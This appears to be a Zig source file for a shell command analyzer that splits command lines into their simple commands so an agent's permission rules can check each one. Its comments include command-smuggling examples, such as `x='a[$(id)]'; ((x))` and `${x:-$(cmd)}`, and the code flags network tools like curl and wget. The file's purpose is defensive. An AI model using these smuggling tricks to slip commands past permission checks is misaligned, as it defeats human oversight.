//! Shell command analyzer (E16.F02.S01.T02). Splits a command line into
//! every simple command it would run, so permission rules see each one:
//! compound lists (`&& || ; | |& &` and newlines), subshells, `if`/`for`/
//! `while` bodies, and command substitutions (`$(...)`, backticks, `<(...)`)
//! all surface their commands. Wrappers that do not change what runs
//! (`timeout`, `nice`, `nohup`, ...) are stripped; wrappers that run another
//! command (`sudo`, `env`, `xargs -0`, `find -exec`, `sh -c`) are flagged and
//! their inner command is surfaced too.
//!
//! Anything the analyzer cannot be sure about sets `unparseable`, and the
//! engine then asks: unterminated quotes, `eval`, a command word that is an
//! expansion (`$CMD args`), trailing `&&`, `case` statements, function
//! definitions, here-docs with substitutions, nesting deeper than 32 and
//! input over 64 KiB. Aliases cannot be known and are not expanded.
//!
//! PowerShell and cmd get a conservative tokenizer (see `analyzePwsh`).
//! All memory comes from the arena.

const std = @import("std");
const Allocator = std.mem.Allocator;
const Shell = @import("../contracts.zig").Shell;
const tables = @import("readonly_cmds.zig");

/// Largest command analysed.
pub const max_input = 64 * 1024;
/// Deepest nesting of substitutions and subshells.
pub const max_depth = 32;

/// The result of `analyze`.
pub const Analysis = struct {
    /// Every simple command, including those inside substitutions.
    commands: []const SimpleCommand,
    /// Why the input could not be analysed; the caller must ask.
    unparseable: ?[]const u8 = null,
    /// A redirect writes to a path (`>`, `>>`, `>|`, `&>`, `<>`).
    has_redirect_write: bool = false,
    /// Redirect targets, unresolved (`/dev/null` is not listed).
    writes: []const []const u8 = &.{},
    /// curl, wget, ssh, ... (risk hint only).
    uses_network_tool: bool = false,

    /// True when every command only reads and nothing is written.
    pub fn isReadOnly(a: *const Analysis) bool {
        if (a.unparseable != null or a.has_redirect_write or a.commands.len == 0) return false;
        for (a.commands) |*c| if (!commandIsReadOnly(c)) return false;
        return true;
    }
};

/// One simple command.
pub const SimpleCommand = struct {
    /// Normalised text for allow matching: unsafe leading assignments kept.
    text: []const u8,
    /// Normalised text for deny/ask matching: all leading assignments
    /// stripped.
    text_any_env: []const u8,
    argv: []const []const u8,
    wrappers_stripped: []const []const u8 = &.{},
    env_assignments: []const []const u8 = &.{},
    /// Runs another command (sudo, env, xargs with flags, find -exec, sh -c,
    /// watch, setsid, ionice, flock) or has destructive find actions.
    exec_wrapper: bool = false,
};

/// Commands that `accept_edits` mode allows when their path arguments stay
/// inside the workspace.
pub const accept_edits_fs_commands = [_][]const u8{ "mkdir", "touch", "rm", "rmdir", "mv", "cp", "sed" };

/// True when the command only reads.
pub fn isReadOnly(sc: *const SimpleCommand) bool {
    return commandIsReadOnly(sc);
}

fn commandIsReadOnly(sc: *const SimpleCommand) bool {
    if (sc.exec_wrapper) return false;
    for (sc.env_assignments) |e| {
        const eq = std.mem.indexOfScalar(u8, e, '=') orelse e.len;
        if (!tables.isSafeEnv(e[0..eq])) return false;
    }
    return tables.isReadOnlyArgv(sc.argv);
}

/// Analyses `cmd` written for `shell`. Never fails: allocation failure and
/// parse problems set `unparseable`.
pub fn analyze(arena: Allocator, cmd: []const u8, shell: Shell) Analysis {
    var out: Out = .{ .arena = arena };
    if (cmd.len > max_input) {
        out.fail("input over 64 KiB");
    } else switch (shell) {
        .posix, .bash, .zsh => {
            var p: Parser = .{ .src = cmd, .out = &out };
            p.parseList(null) catch |e| out.fail(@errorName(e));
            if (out.unparseable == null and p.heredocs.items.len > 0) out.fail("unterminated here-document");
        },
        .fish => {
            // fish shares enough syntax for splitting; its `(cmd)`
            // substitution is not POSIX, so treat parens as unparseable.
            if (std.mem.indexOfAny(u8, cmd, "()") != null) {
                out.fail("fish command substitution is not analysed");
            } else {
                var p: Parser = .{ .src = cmd, .out = &out };
                p.parseList(null) catch |e| out.fail(@errorName(e));
            }
        },
        .pwsh, .cmd => analyzePwsh(&out, cmd, shell, 0) catch |e| out.fail(@errorName(e)),
    }
    return .{
        .commands = out.commands.items,
        .unparseable = out.unparseable,
        .has_redirect_write = out.has_redirect_write,
        .writes = out.writes.items,
        .uses_network_tool = out.uses_network_tool,
    };
}

const Out = struct {
    arena: Allocator,
    commands: std.ArrayList(SimpleCommand) = .empty,
    writes: std.ArrayList([]const u8) = .empty,
    unparseable: ?[]const u8 = null,
    has_redirect_write: bool = false,
    uses_network_tool: bool = false,

    fn fail(o: *Out, why: []const u8) void {
        if (o.unparseable == null) o.unparseable = why;
    }
};

const Error = error{ OutOfMemory, Unparseable };

/// A lexed word. `value` has quotes removed and escapes applied; `text`
/// is the normalised form used for matching (`value`, or the raw source
/// when the word is quoted and contains whitespace or glob characters, or
/// contains an expansion).
const Word = struct {
    raw: []const u8,
    value: []const u8,
    text: []const u8,
    quoted: bool = false,
    has_expansion: bool = false,
    leading_expansion: bool = false,
};

const Heredoc = struct { delim: []const u8, strip_tabs: bool, quoted: bool };

const Parser = struct {
    src: []const u8,
    i: usize = 0,
    depth: u32 = 0,
    out: *Out,
    heredocs: std.ArrayList(Heredoc) = .empty,

    fn fail(p: *Parser, why: []const u8) Error {
        p.out.fail(why);
        return error.Unparseable;
    }

    fn peek(p: *Parser) ?u8 {
        return if (p.i < p.src.len) p.src[p.i] else null;
    }

    fn peekAt(p: *Parser, off: usize) ?u8 {
        return if (p.i + off < p.src.len) p.src[p.i + off] else null;
    }

    fn startsWith(p: *Parser, s: []const u8) bool {
        return std.mem.startsWith(u8, p.src[p.i..], s);
    }

    /// Skips blanks, comments and line continuations (not newlines).
    fn skipBlanks(p: *Parser) void {
        while (p.peek()) |c| {
            if (c == ' ' or c == '\t' or c == '\r') {
                p.i += 1;
            } else if (c == '\\' and p.peekAt(1) == '\n') {
                p.i += 2;
            } else if (c == '#') {
                while (p.peek()) |d| : (p.i += 1) if (d == '\n') break;
            } else break;
        }
    }

    fn isMeta(c: u8) bool {
        return switch (c) {
            ' ', '\t', '\r', '\n', ';', '&', '|', '(', ')', '<', '>' => true,
            else => false,
        };
    }

    /// Parses a list until `term` (`)` for subshells and `$(`) or the end.
    fn parseList(p: *Parser, term: ?u8) Error!void {
        p.depth += 1;
        defer p.depth -= 1;
        if (p.depth > max_depth) return p.fail("nesting deeper than 32");
        var need_cmd = false; // after && || | the list must continue
        var have_any = false;
        while (true) {
            p.skipBlanks();
            const c = p.peek() orelse {
                if (need_cmd) return p.fail("trailing operator");
                return;
            };
            if (term != null and c == term.?) {
                if (need_cmd) return p.fail("trailing operator");
                return;
            }
            if (c == '\n') {
                p.i += 1;
                try p.readHeredocBodies();
                if (!need_cmd) continue;
                continue; // `a &&\n b` is valid
            }
            if (c == ')') return p.fail("unbalanced parenthesis");
            if (c == ';' or c == '&' or c == '|') return p.fail("operator without a command");
            try p.parseCommand(term);
            have_any = true;
            need_cmd = false;
            // Separator.
            p.skipBlanks();
            const s = p.peek() orelse return;
            if (term != null and s == term.?) return;
            if (p.startsWith("&&") or p.startsWith("||")) {
                p.i += 2;
                need_cmd = true;
            } else if (p.startsWith(";;")) {
                return p.fail("case statements are not analysed");
            } else if (p.startsWith("|&")) {
                p.i += 2;
                need_cmd = true;
            } else if (s == '|') {
                p.i += 1;
                need_cmd = true;
            } else if (s == ';' or s == '&') {
                p.i += 1;
            } else if (s == '\n') {
                // handled at the top of the loop
            } else if (s == ')') {
                return p.fail("unbalanced parenthesis");
            } else {
                return p.fail("unexpected token after command");
            }
        }
    }

    fn readHeredocBodies(p: *Parser) Error!void {
        for (p.heredocs.items) |h| {
            const body_start = p.i;
            var found = false;
            while (p.i < p.src.len) {
                const eol = std.mem.indexOfScalarPos(u8, p.src, p.i, '\n') orelse p.src.len;
                var line = p.src[p.i..eol];
                if (h.strip_tabs) line = std.mem.trimStart(u8, line, "\t");
                p.i = @min(eol + 1, p.src.len);
                if (std.mem.eql(u8, std.mem.trimEnd(u8, line, "\r"), h.delim)) {
                    found = true;
                    if (!h.quoted) {
                        const body = p.src[body_start..@min(eol, p.src.len)];
                        if (std.mem.indexOf(u8, body, "$(") != null or std.mem.indexOfScalar(u8, body, '`') != null)
                            return p.fail("here-document with command substitution");
                    }
                    break;
                }
            }
            if (!found) return p.fail("unterminated here-document");
        }
        p.heredocs.clearRetainingCapacity();
    }

    const reserved_prefix = [_][]const u8{ "!", "if", "then", "else", "elif", "do", "while", "until", "{" };
    const reserved_end = [_][]const u8{ "fi", "done", "}" };

    fn parseCommand(p: *Parser, term: ?u8) Error!void {
        // Reserved words that introduce a command.
        while (true) {
            p.skipBlanks();
            const w = p.peekBareWord() orelse break;
            if (inSet(&reserved_prefix, w)) {
                p.i += w.len;
                continue;
            }
            if (inSet(&reserved_end, w)) {
                p.i += w.len;
                // Redirections may follow `done`/`fi`/`}`.
                return p.parseTrailingRedirects(term);
            }
            if (std.mem.eql(u8, w, "case")) return p.fail("case statements are not analysed");
            if (std.mem.eql(u8, w, "function")) return p.fail("function definitions are not analysed");
            if (std.mem.eql(u8, w, "for") or std.mem.eql(u8, w, "select")) {
                // `for name in words` up to the separator; words may hold
                // substitutions, which readWord surfaces.
                p.i += w.len;
                while (true) {
                    p.skipBlanks();
                    const c = p.peek() orelse return;
                    if (c == ';' or c == '\n' or c == '&' or c == '|' or c == ')') return;
                    _ = try p.readWord();
                }
            }
            break;
        }
        p.skipBlanks();
        const c = p.peek() orelse return p.fail("missing command");
        if (c == '(') {
            if (p.peekAt(1) == '(') return p.skipArithmetic();
            p.i += 1;
            const before = p.out.commands.items.len;
            try p.parseList(')');
            if (p.peek() != ')') return p.fail("unterminated subshell");
            if (p.out.commands.items.len == before) return p.fail("empty subshell");
            p.i += 1;
            return p.parseTrailingRedirects(term);
        }
        var words: std.ArrayList(Word) = .empty;
        while (true) {
            p.skipBlanks();
            const d = p.peek() orelse break;
            if (d == '\n' or d == ';' or d == '|' or d == ')') break;
            if (d == '&' and p.peekAt(1) != '>') break;
            if (term != null and d == term.?) break;
            if ((d == '<' or d == '>') and p.peekAt(1) == '(') {
                try p.procSubst();
                continue;
            }
            if (p.redirectAhead()) {
                try p.parseRedirect();
                continue;
            }
            if (d == '(') {
                if (words.items.len == 1) return p.fail("function definitions are not analysed");
                return p.fail("unexpected parenthesis");
            }
            try words.append(p.out.arena, try p.readWord());
        }
        try buildCommand(p.out, words.items, p.depth);
    }

    fn parseTrailingRedirects(p: *Parser, term: ?u8) Error!void {
        while (true) {
            p.skipBlanks();
            const d = p.peek() orelse return;
            if (term != null and d == term.?) return;
            if (!p.redirectAhead()) return;
            try p.parseRedirect();
        }
    }

    fn skipArithmetic(p: *Parser) Error!void {
        // `((expr))` or `$((expr))`: skip to the matching `))`. Bash runs
        // command substitutions inside arithmetic and recursively evaluates
        // variable values as expressions (`x='a[$(id)]'; ((x))` runs `id`),
        // so only purely numeric arithmetic is skipped; anything naming a
        // variable, expanding or quoting is unparseable (and so asks).
        var depth: u32 = 0;
        while (p.peek()) |c| {
            p.i += 1;
            switch (c) {
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if (depth == 0) {
                        if (p.src[p.i - 2] != ')') return p.fail("unbalanced arithmetic");
                        return;
                    }
                },
                '0'...'9', ' ', '\t', '+', '-', '*', '/', '%', '<', '>', '=', '!', '&', '|', '^', '~', '?', ':', ',' => {},
                else => return p.fail("arithmetic with names or expansions is not analysed"),
            }
        }
        return p.fail("unterminated arithmetic");
    }

    /// The next unquoted word made only of word characters (for reserved
    /// word checks), without consuming it.
    fn peekBareWord(p: *Parser) ?[]const u8 {
        var j = p.i;
        while (j < p.src.len and !isMeta(p.src[j]) and p.src[j] != '"' and p.src[j] != '\'' and p.src[j] != '\\' and p.src[j] != '$' and p.src[j] != '`') j += 1;
        if (j == p.i) return null;
        if (j < p.src.len and !isMeta(p.src[j])) return null; // quoted/expanded continuation
        return p.src[p.i..j];
    }

    fn redirectAhead(p: *Parser) bool {
        var j = p.i;
        while (j < p.src.len and std.ascii.isDigit(p.src[j])) j += 1;
        if (j < p.src.len and (p.src[j] == '<' or p.src[j] == '>')) return true;
        return j == p.i and p.startsWith("&>");
    }

    fn parseRedirect(p: *Parser) Error!void {
        while (p.peek()) |c| {
            if (!std.ascii.isDigit(c)) break;
            p.i += 1;
        }
        const ops = [_][]const u8{ "&>>", "&>", "<<<", "<<-", "<<", "<>", "<&", ">>", ">|", ">&", "<", ">" };
        var op: []const u8 = "";
        for (ops) |o| if (p.startsWith(o)) {
            op = o;
            break;
        };
        p.i += op.len;
        p.skipBlanks();
        const d = p.peek() orelse return p.fail("redirection without a target");
        if (isMeta(d)) return p.fail("redirection without a target");
        const target = try p.readWord();
        if (std.mem.eql(u8, op, "<<") or std.mem.eql(u8, op, "<<-")) {
            try p.heredocs.append(p.out.arena, .{ .delim = target.value, .strip_tabs = op.len == 3, .quoted = target.quoted });
            return;
        }
        const dup = (std.mem.eql(u8, op, ">&") or std.mem.eql(u8, op, "<&")) and
            (std.mem.eql(u8, target.value, "-") or allDigits(target.value));
        const writes = !dup and (op[op.len - 1] == '>' or std.mem.eql(u8, op, ">|") or std.mem.eql(u8, op, "<>") or std.mem.eql(u8, op, ">&") or std.mem.eql(u8, op, "&>>"));
        if (writes and !std.mem.eql(u8, target.value, "/dev/null")) {
            p.out.has_redirect_write = true;
            try p.out.writes.append(p.out.arena, target.text);
        }
    }

    fn procSubst(p: *Parser) Error!void {
        p.i += 2; // `<(` or `>(`
        try p.parseList(')');
        if (p.peek() != ')') return p.fail("unterminated process substitution");
        p.i += 1;
    }

    fn readWord(p: *Parser) Error!Word {
        const a = p.out.arena;
        const start = p.i;
        var val: std.ArrayList(u8) = .empty;
        var w: Word = .{ .raw = "", .value = "", .text = "" };
        while (p.peek()) |c| {
            if (isMeta(c)) break;
            switch (c) {
                '\\' => {
                    if (p.peekAt(1)) |n| {
                        if (n != '\n') try val.append(a, n);
                        p.i += 2;
                    } else {
                        try val.append(a, '\\');
                        p.i += 1;
                    }
                    w.quoted = true;
                },
                '\'' => {
                    const end = std.mem.indexOfScalarPos(u8, p.src, p.i + 1, '\'') orelse return p.fail("unterminated single quote");
                    try val.appendSlice(a, p.src[p.i + 1 .. end]);
                    p.i = end + 1;
                    w.quoted = true;
                },
                '"' => {
                    w.quoted = true;
                    p.i += 1;
                    while (true) {
                        const d = p.peek() orelse return p.fail("unterminated double quote");
                        if (d == '"') {
                            p.i += 1;
                            break;
                        }
                        if (d == '\\') {
                            const n = p.peekAt(1) orelse return p.fail("unterminated double quote");
                            if (n == '$' or n == '`' or n == '"' or n == '\\') {
                                try val.append(a, n);
                            } else if (n != '\n') {
                                try val.appendSlice(a, &.{ '\\', n });
                            }
                            p.i += 2;
                        } else if (d == '$' or d == '`') {
                            const at_start = val.items.len == 0 and p.i == start + 1;
                            try p.expansion(&val, &w, at_start);
                        } else {
                            try val.append(a, d);
                            p.i += 1;
                        }
                    }
                },
                '$', '`' => try p.expansion(&val, &w, val.items.len == 0 and p.i == start),
                else => {
                    try val.append(a, c);
                    p.i += 1;
                },
            }
        }
        w.raw = p.src[start..p.i];
        w.value = val.items;
        const needs_quotes = std.mem.indexOfAny(u8, w.value, " \t\n*?[") != null;
        w.text = if (w.has_expansion or (w.quoted and needs_quotes)) w.raw else w.value;
        return w;
    }

    /// `$name`, `${...}`, `$(...)`, `$((...))`, `$'...'` or a backtick
    /// substitution at `p.i`. Appends the raw text to `val`; surfaces the
    /// commands of substitutions.
    fn expansion(p: *Parser, val: *std.ArrayList(u8), w: *Word, at_start: bool) Error!void {
        const a = p.out.arena;
        const start = p.i;
        if (p.peek() == '`') {
            var j = p.i + 1;
            var inner: std.ArrayList(u8) = .empty;
            while (j < p.src.len and p.src[j] != '`') : (j += 1) {
                if (p.src[j] == '\\' and j + 1 < p.src.len) {
                    j += 1;
                    if (p.src[j] != '`' and p.src[j] != '\\' and p.src[j] != '$') try inner.append(a, '\\');
                }
                try inner.append(a, p.src[j]);
            }
            if (j >= p.src.len) return p.fail("unterminated backtick");
            p.i = j + 1;
            var sub: Parser = .{ .src = inner.items, .out = p.out, .depth = p.depth };
            try sub.parseList(null);
            if (sub.heredocs.items.len > 0) return p.fail("unterminated here-document");
            w.has_expansion = true;
            if (at_start) w.leading_expansion = true;
            try val.appendSlice(a, p.src[start..p.i]);
            return;
        }
        // `$`
        const n = p.peekAt(1) orelse {
            try val.append(a, '$');
            p.i += 1;
            return;
        };
        if (n == '(') {
            if (p.peekAt(2) == '(') {
                p.i += 1;
                try p.skipArithmetic();
            } else {
                p.i += 2;
                try p.parseList(')');
                if (p.peek() != ')') return p.fail("unterminated command substitution");
                p.i += 1;
            }
        } else if (n == '{') {
            const end = std.mem.indexOfScalarPos(u8, p.src, p.i + 2, '}') orelse return p.fail("unterminated parameter expansion");
            // `${x:-$(cmd)}` hides a command; refuse rather than guess.
            if (std.mem.indexOf(u8, p.src[p.i..end], "$(") != null or std.mem.indexOfScalar(u8, p.src[p.i..end], '`') != null)
                return p.fail("command substitution inside parameter expansion");
            p.i = end + 1;
        } else if (n == '\'') {
            // ANSI-C quoting: a literal string.
            var j = p.i + 2;
            while (j < p.src.len and p.src[j] != '\'') : (j += 1) {
                if (p.src[j] == '\\') j += 1;
            }
            if (j >= p.src.len) return p.fail("unterminated $'...' string");
            try val.appendSlice(a, p.src[p.i + 2 .. j]);
            p.i = j + 1;
            w.quoted = true;
            return;
        } else if (std.ascii.isAlphabetic(n) or n == '_') {
            p.i += 2;
            while (p.peek()) |c| {
                if (!std.ascii.isAlphanumeric(c) and c != '_') break;
                p.i += 1;
            }
        } else if (std.ascii.isDigit(n) or std.mem.indexOfScalar(u8, "@*#?$!-", n) != null) {
            p.i += 2;
        } else {
            try val.append(a, '$');
            p.i += 1;
            return;
        }
        w.has_expansion = true;
        if (at_start) w.leading_expansion = true;
        try val.appendSlice(a, p.src[start..p.i]);
    }
};

fn allDigits(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| if (!std.ascii.isDigit(c)) return false;
    return true;
}

fn inSet(set: []const []const u8, s: []const u8) bool {
    for (set) |x| if (std.mem.eql(u8, x, s)) return true;
    return false;
}

fn isAssignment(w: Word) bool {
    const eq = std.mem.indexOfScalar(u8, w.raw, '=') orelse return false;
    if (eq == 0) return false;
    for (w.raw[0..eq], 0..) |c, i| {
        if (!(std.ascii.isAlphabetic(c) or c == '_' or (i > 0 and std.ascii.isDigit(c)))) return false;
    }
    return true;
}

/// Turns lexed words into a SimpleCommand (plus inner commands of exec
/// wrappers) and appends them.
fn buildCommand(out: *Out, words: []const Word, depth: u32) Error!void {
    if (depth > max_depth) {
        out.fail("nesting deeper than 32");
        return error.Unparseable;
    }
    const a = out.arena;
    var k: usize = 0;
    var envs: std.ArrayList([]const u8) = .empty;
    while (k < words.len and isAssignment(words[k])) : (k += 1) try envs.append(a, words[k].text);
    if (k == words.len) return; // assignments only
    const rest = words[k..];
    if (rest[0].leading_expansion) {
        out.fail("command word is a variable expansion");
        return error.Unparseable;
    }
    var argv_list = try a.alloc([]const u8, rest.len);
    for (rest, 0..) |w, i| argv_list[i] = w.text;
    var argv: []const []const u8 = argv_list;
    var wrappers: std.ArrayList([]const u8) = .empty;

    // Strip transparent wrappers.
    strip: while (argv.len > 0) {
        const c = argv[0];
        var skip: usize = 0;
        if (eql(c, "nohup") or eql(c, "builtin") or eql(c, "noglob")) {
            skip = 1;
        } else if (eql(c, "time")) {
            skip = 1;
            if (argv.len > 1 and eql(argv[1], "-p")) skip = 2;
        } else if (eql(c, "exec")) {
            if (argv.len == 1) {
                out.fail("exec without a command");
                return error.Unparseable;
            }
            skip = 1;
        } else if (eql(c, "command")) {
            if (argv.len > 1 and (eql(argv[1], "-v") or eql(argv[1], "-V"))) break :strip;
            skip = 1;
            if (argv.len > 1 and eql(argv[1], "-p")) skip = 2;
        } else if (eql(c, "nice")) {
            skip = 1;
            if (argv.len > 2 and eql(argv[1], "-n")) {
                skip = 3;
            } else if (argv.len > 1 and (std.mem.startsWith(u8, argv[1], "-") or std.mem.startsWith(u8, argv[1], "--adjustment"))) skip = 2;
        } else if (eql(c, "timeout")) {
            var j: usize = 1;
            while (j < argv.len and std.mem.startsWith(u8, argv[j], "-")) : (j += 1) {
                if ((eql(argv[j], "-s") or eql(argv[j], "-k")) and j + 1 < argv.len) j += 1;
            }
            if (j >= argv.len) break :strip; // no duration
            skip = j + 1;
        } else if (eql(c, "stdbuf")) {
            var j: usize = 1;
            while (j < argv.len and std.mem.startsWith(u8, argv[j], "-")) : (j += 1) {
                if (argv[j].len == 2 and j + 1 < argv.len) j += 1; // `-o L`
            }
            skip = j;
        } else if (eql(c, "xargs") and (argv.len == 1 or !std.mem.startsWith(u8, argv[1], "-"))) {
            skip = 1;
        }
        if (skip == 0 or skip >= argv.len) {
            if (skip != 0) {
                try wrappers.append(a, c);
                argv = argv[argv.len..];
            }
            break;
        }
        try wrappers.append(a, c);
        argv = argv[skip..];
    }
    if (argv.len == 0) {
        // A bare wrapper (`nohup`, `time`) runs nothing interesting but
        // keep it visible as a command.
        argv = argv_list[argv_list.len - 1 ..];
    }

    const name = argv[0];
    if (eql(name, "eval")) {
        out.fail("eval");
        return error.Unparseable;
    }
    if ((eql(name, "source") or eql(name, ".")) and argv.len > 1) {
        const idx = rest.len - argv.len + 1;
        if (rest[idx].has_expansion) {
            out.fail("source of a variable path");
            return error.Unparseable;
        }
    }
    if (tables.isNetworkTool(name)) out.uses_network_tool = true;

    var exec_wrapper = false;
    var inner: ?[]const Word = null;
    const rest_off = rest.len - argv.len; // argv[i] == rest[rest_off + i].text
    if (eql(name, "sudo") or eql(name, "doas") or eql(name, "watch") or eql(name, "setsid") or eql(name, "ionice") or eql(name, "xargs")) {
        exec_wrapper = true;
        var j: usize = 1;
        while (j < argv.len and std.mem.startsWith(u8, argv[j], "-")) : (j += 1) {
            // Options with a separate value.
            if (optTakesValue(name, argv[j]) and j + 1 < argv.len) j += 1;
        }
        if (j < argv.len) inner = rest[rest_off + j ..];
    } else if (eql(name, "flock")) {
        exec_wrapper = true;
        var j: usize = 1;
        while (j < argv.len and std.mem.startsWith(u8, argv[j], "-")) : (j += 1) {
            if (eql(argv[j], "-c") and j + 1 < argv.len) {
                try analyzeInline(out, rest[rest_off + j + 1], depth);
                j = argv.len;
                break;
            }
        }
        if (j + 1 < argv.len) inner = rest[rest_off + j + 1 ..]; // after the lock file
    } else if (eql(name, "env")) {
        var j: usize = 1;
        while (j < argv.len and (std.mem.startsWith(u8, argv[j], "-") or isAssignment(rest[rest_off + j]))) : (j += 1) {
            if ((eql(argv[j], "-u") or eql(argv[j], "-C") or eql(argv[j], "-S")) and j + 1 < argv.len) j += 1;
        }
        if (j < argv.len) {
            exec_wrapper = true;
            inner = rest[rest_off + j ..];
        }
    } else if (eql(name, "su")) {
        exec_wrapper = true;
        for (argv[1..], 1..) |arg, j| if ((eql(arg, "-c") or eql(arg, "--command")) and j + 1 < argv.len) {
            try analyzeInline(out, rest[rest_off + j + 1], depth);
        };
    } else if (eql(name, "sh") or eql(name, "bash") or eql(name, "zsh") or eql(name, "dash") or eql(name, "ksh")) {
        for (argv[1..], 1..) |arg, j| {
            if (arg.len >= 2 and arg[0] == '-' and arg[1] != '-' and std.mem.indexOfScalar(u8, arg, 'c') != null) {
                exec_wrapper = true;
                if (j + 1 >= argv.len) {
                    out.fail("shell -c without a command");
                    return error.Unparseable;
                }
                try analyzeInline(out, rest[rest_off + j + 1], depth);
                break;
            }
        }
    } else if (eql(name, "find")) {
        for (argv[1..], 1..) |arg, j| {
            if (eql(arg, "-exec") or eql(arg, "-execdir") or eql(arg, "-ok") or eql(arg, "-okdir")) {
                exec_wrapper = true;
                var end = j + 1;
                while (end < argv.len and !eql(argv[end], ";") and !eql(argv[end], "+") and !eql(argv[end], "\\;")) end += 1;
                if (end > j + 1) try buildCommand(out, rest[rest_off + j + 1 .. rest_off + end], depth + 1);
            } else if (eql(arg, "-delete") or std.mem.startsWith(u8, arg, "-fprint") or eql(arg, "-fls") or eql(arg, "-files0-from")) {
                exec_wrapper = true;
            }
        }
    }

    // Normalised texts.
    var any_env: std.ArrayList(u8) = .empty;
    for (argv, 0..) |w, i| {
        if (i > 0) try any_env.append(a, ' ');
        try any_env.appendSlice(a, w);
    }
    var text: std.ArrayList(u8) = .empty;
    for (envs.items) |e| {
        const eq = std.mem.indexOfScalar(u8, e, '=') orelse e.len;
        if (tables.isSafeEnv(e[0..eq])) continue;
        try text.appendSlice(a, e);
        try text.append(a, ' ');
    }
    try text.appendSlice(a, any_env.items);
    try out.commands.append(a, .{
        .text = text.items,
        .text_any_env = any_env.items,
        .argv = argv,
        .wrappers_stripped = wrappers.items,
        .env_assignments = envs.items,
        .exec_wrapper = exec_wrapper,
    });
    if (inner) |iw| try buildCommand(out, iw, depth + 1);
}

fn optTakesValue(cmd: []const u8, opt: []const u8) bool {
    if (eql(cmd, "sudo")) return eql(opt, "-u") or eql(opt, "-g") or eql(opt, "-C") or eql(opt, "-D") or eql(opt, "-h") or eql(opt, "-p") or eql(opt, "-U");
    if (eql(cmd, "doas")) return eql(opt, "-u") or eql(opt, "-C");
    if (eql(cmd, "watch")) return eql(opt, "-n") or eql(opt, "-d") or eql(opt, "-q");
    if (eql(cmd, "ionice")) return eql(opt, "-c") or eql(opt, "-n") or eql(opt, "-p");
    if (eql(cmd, "xargs")) return eql(opt, "-I") or eql(opt, "-n") or eql(opt, "-P") or eql(opt, "-L") or eql(opt, "-d") or eql(opt, "-E") or eql(opt, "-s") or eql(opt, "-a");
    return false;
}

/// Analyses the literal string argument of `sh -c`, `su -c` or `flock -c`.
fn analyzeInline(out: *Out, w: Word, depth: u32) Error!void {
    if (w.has_expansion) {
        out.fail("shell -c with an expanded command");
        return error.Unparseable;
    }
    var p: Parser = .{ .src = w.value, .out = out, .depth = depth };
    try p.parseList(null);
    if (p.heredocs.items.len > 0) {
        out.fail("unterminated here-document");
        return error.Unparseable;
    }
}

fn eql(a: []const u8, b: []const u8) bool {
    return std.mem.eql(u8, a, b);
}

/// Conservative PowerShell / cmd analysis: splits on `;`, `|`, `&&`, `||`
/// and newlines, handles `'...'`, `"..."`, backtick (pwsh) escapes and
/// `$(...)` subexpressions. Dynamic invocation is unparseable.
fn analyzePwsh(out: *Out, src: []const u8, shell: Shell, depth: u32) Error!void {
    if (depth > max_depth) {
        out.fail("nesting deeper than 32");
        return error.Unparseable;
    }
    const a = out.arena;
    if (shell == .cmd and std.mem.indexOfScalar(u8, src, '^') != null) {
        out.fail("cmd caret escapes are not analysed");
        return error.Unparseable;
    }
    var words: std.ArrayList(Word) = .empty;
    var i: usize = 0;
    var need_cmd = false;
    while (true) {
        while (i < src.len and (src[i] == ' ' or src[i] == '\t' or src[i] == '\r')) i += 1;
        const at_end = i >= src.len;
        const sep = !at_end and (src[i] == ';' or src[i] == '|' or src[i] == '\n' or (src[i] == '&' and i + 1 < src.len and src[i + 1] == '&'));
        if (at_end or sep) {
            if (words.items.len > 0) {
                try pwshCommand(out, words.items, shell, depth);
                words = .empty;
                need_cmd = false;
            } else if (sep and src[i] != '\n' and src[i] != ';') {
                out.fail("operator without a command");
                return error.Unparseable;
            }
            if (at_end) {
                if (need_cmd) {
                    out.fail("trailing operator");
                    return error.Unparseable;
                }
                return;
            }
            if (std.mem.startsWith(u8, src[i..], "&&") or std.mem.startsWith(u8, src[i..], "||")) {
                i += 2;
                need_cmd = true;
            } else {
                if (src[i] == '|') need_cmd = true;
                i += 1;
            }
            continue;
        }
        // A word.
        const start = i;
        var val: std.ArrayList(u8) = .empty;
        var w: Word = .{ .raw = "", .value = "", .text = "" };
        while (i < src.len) {
            const c = src[i];
            if (c == ' ' or c == '\t' or c == '\r' or c == '\n' or c == ';' or c == '|') break;
            if (c == '&' and i + 1 < src.len and src[i + 1] == '&') break;
            if (c == '`' and shell == .pwsh) {
                if (i + 1 < src.len) try val.append(a, src[i + 1]);
                i = @min(i + 2, src.len);
                w.quoted = true;
            } else if (c == '\'') {
                const end = std.mem.indexOfScalarPos(u8, src, i + 1, '\'') orelse {
                    out.fail("unterminated single quote");
                    return error.Unparseable;
                };
                try val.appendSlice(a, src[i + 1 .. end]);
                i = end + 1;
                w.quoted = true;
            } else if (c == '"') {
                const end = std.mem.indexOfScalarPos(u8, src, i + 1, '"') orelse {
                    out.fail("unterminated double quote");
                    return error.Unparseable;
                };
                const body = src[i + 1 .. end];
                if (std.mem.indexOf(u8, body, "$(") != null) {
                    out.fail("subexpression inside a string");
                    return error.Unparseable;
                }
                if (std.mem.indexOfScalar(u8, body, '$') != null or (shell == .cmd and std.mem.indexOfScalar(u8, body, '%') != null)) w.has_expansion = true;
                try val.appendSlice(a, body);
                i = end + 1;
                w.quoted = true;
            } else if (c == '$' and i + 1 < src.len and src[i + 1] == '(' and shell == .pwsh) {
                var d: u32 = 0;
                var j = i + 1;
                while (j < src.len) : (j += 1) {
                    if (src[j] == '(') d += 1;
                    if (src[j] == ')') {
                        d -= 1;
                        if (d == 0) break;
                    }
                }
                if (j >= src.len) {
                    out.fail("unterminated subexpression");
                    return error.Unparseable;
                }
                try analyzePwsh(out, src[i + 2 .. j], shell, depth + 1);
                if (val.items.len == 0) w.leading_expansion = true;
                w.has_expansion = true;
                try val.appendSlice(a, src[i .. j + 1]);
                i = j + 1;
            } else if ((c == '$' and shell == .pwsh) or (c == '%' and shell == .cmd)) {
                if (val.items.len == 0) w.leading_expansion = true;
                w.has_expansion = true;
                try val.append(a, c);
                i += 1;
            } else if (c == '{' and shell == .pwsh) {
                out.fail("script blocks are not analysed");
                return error.Unparseable;
            } else {
                try val.append(a, c);
                i += 1;
            }
        }
        w.raw = src[start..i];
        w.value = val.items;
        const needs_quotes = std.mem.indexOfAny(u8, w.value, " \t*?[") != null;
        w.text = if (w.has_expansion or (w.quoted and needs_quotes)) w.raw else w.value;
        try words.append(a, w);
    }
}

